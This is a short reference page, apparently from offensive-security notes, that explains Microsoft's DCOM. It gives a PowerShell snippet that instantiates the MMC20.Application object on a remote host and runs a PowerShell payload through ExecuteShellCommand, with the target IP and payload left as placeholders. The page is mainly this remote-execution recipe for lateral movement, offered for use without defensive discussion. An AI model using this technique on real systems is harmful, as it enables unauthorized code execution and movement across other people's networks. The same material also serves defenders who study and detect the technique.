# DCOM

**Distributed Component Object Model** (DCOM) is a Microsoft technology that allows software components to communicate over a network, enabling remote procedure calls.&#x20;

The following PowerShell code uses DCOM to create an instance of the Microsoft Management Console (MMC) on a remote machine and executes a PowerShell command payload through the MMC's shell command interface.

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target_ip>"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"<payload>","7")
```

